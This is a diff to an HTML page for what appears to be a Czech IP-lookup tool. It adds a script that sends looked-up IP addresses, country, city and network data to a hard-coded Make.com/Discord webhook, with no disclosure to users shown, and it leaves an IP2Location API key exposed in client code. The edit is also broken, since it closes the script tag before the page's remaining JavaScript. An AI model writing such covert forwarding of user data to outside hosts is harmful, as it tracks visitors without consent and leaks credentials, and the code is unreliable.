@@ -90,12 +90,32 @@
     </footer>
 
     <!-- JavaScript logic -->
-    <script>
-        // --- CONFIGURATION ---
-        const API_KEY = '10D1DD103AB750F405A5CD9039EA10A9'; // Sem vlož svůj IP2Location klíč
-        const DISCORD_WEBHOOK_URL = 'https://hook.eu1.make.com/35ucd6h55lc948mqse18sakjpm6ekhhg'; // Např. https://discord.com/api/webhooks/...
-        // ---------------------
+<script>
+    // --- CONFIGURATION ---
+    const API_KEY = '10D1DD103AB750F405A5CD9039EA10A9';
+    const DISCORD_WEBHOOK_URL = 'https://hook.eu1.make.com/35ucd6h55lc948mqse18sakjpm6ekhhg';
+    // ---------------------
 
+    // Funkce pro odeslání dat na Discord přes Make.com
+    function sendToDiscord(ipData) {
+        fetch(DISCORD_WEBHOOK_URL, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                ip: ipData.ip,
+                country: ipData.country_name,
+                city: ipData.city,
+                as: ipData.as
+            })
+        })
+        .catch(error => {
+            console.error('Chyba při odesílání webhooku:', error);
+        });
+    }
+</script>
+    
         const ipInput = document.getElementById('ipInput');
         const searchBtn = document.getElementById('searchBtn');
         const myIpBtn = document.getElementById('myIpBtn');
